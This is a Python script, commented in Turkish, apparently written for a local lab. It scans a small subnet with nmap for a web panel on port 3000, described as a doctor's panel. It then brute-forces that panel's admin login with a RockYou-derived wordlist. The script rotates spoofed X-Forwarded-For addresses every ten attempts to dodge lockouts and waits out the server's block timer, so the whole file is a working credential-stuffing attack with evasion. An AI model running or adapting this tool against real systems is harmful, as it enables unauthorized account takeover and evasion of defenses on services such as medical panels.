import requests
import time
import re
import random
import os

# --- 1. OTOMATİK HEDEF KEŞFİ (RECONNAISSANCE) ---
def hedef_bul():
    print("\n" + "="*60)
    print("🔍 AĞ TARANIYOR: Hedef Doktor Paneli Aranıyor...")
    print("="*60)
    
    # Nmap ile 172.20.10.0/28 ağında 3000 portu açık olan cihazı ara
    # /28 senin 'ip a' komutundan gelen ağ maskesi
    komut = "nmap -p 3000 --open 172.20.10.0/28 | grep 'Nmap scan report' | awk '{print $NF}'"
    bulunan = os.popen(komut).read().strip().replace('(', '').replace(')', '')
    
    if bulunan:
        print(f"🎯 HEDEF TESPİT EDİLDİ: {bulunan}")
        return f"http://{bulunan}:3000/login"
    else:
        print("❌ HATA: Ağda 3000 portu açık cihaz bulunamadı!")
        return None

# --- 2. AYARLAR VE KİMLİK SİMÜLASYONU ---
HEDEF_USER = "admin"
WORDLIST = "gercek_sifreler.txt" # RockYou'dan kısalttığımız liste

def sahte_ip_uret():
    return f"172.20.10.{random.randint(50, 250)}"

# --- 3. ANA SALDIRI DÖNGÜSÜ ---
def saldiriyi_baslat(url):
    try:
        with open(WORDLIST, "r", encoding="latin-1") as dosya:
            sifreler = dosya.readlines()
    except FileNotFoundError:
        print(f"[!] HATA: {WORDLIST} bulunamadı!")
        return

    guncel_ip = sahte_ip_uret()
    deneme_sayisi = 0
    index = 0

    print(f"\n🚀 Saldırı Başlatılıyor... [Hedef: {url}]\n")

    while index < len(sifreler):
        sifre = sifreler[index].strip()
        
        # Her 10 denemede bir kimlik değiştir (Ban yememek için)
        if deneme_sayisi >= 10:
            guncel_ip = sahte_ip_uret()
            deneme_sayisi = 0
            print(f"\n🔄 KİMLİK DEĞİŞTİRİLDİ: Yeni IP -> {guncel_ip}\n")

        print(f"[?] [{guncel_ip}] Deneniyor: {sifre}")
        
        headers = {'X-Forwarded-For': guncel_ip}
        data = {'user': HEDEF_USER, 'pass': sifre}

        try:
            cevap = requests.post(url, data=data, headers=headers)
            
            # SAVUNMA ANALİZİ
            if "ERİŞİM ENGELLENDİ" in cevap.text:
                saniye_bul = re.search(r"id=\"clock\">(\d+)<", cevap.text)
                if saniye_bul:
                    bekle = int(saniye_bul.group(1))
                    print(f"⚠️  SAVUNMA DUVARI: {bekle}sn engel. Pusuya yatılıyor...")
                    time.sleep(bekle + 1)
                    continue 

            elif "Hatalı Şifre" not in cevap.text and "Giriş bilgileri" not in cevap.text:
                print("\n" + "!"*60)
                print(f"🎉 SİSTEME SIZILDI! DOĞRU ŞİFRE: {sifre}")
                print(f"🔑 Sızma IP Adresi: {guncel_ip}")
                print("!"*60 + "\n")
                break
            else:
                deneme_sayisi += 1
                index += 1

        except Exception as e:
            print(f"[!] Bağlantı hatası: {e}")
            time.sleep(2)

# --- ÇALIŞTIR ---
hedef_url = hedef_bul()
if hedef_url:
    saldiriyi_baslat(hedef_url)
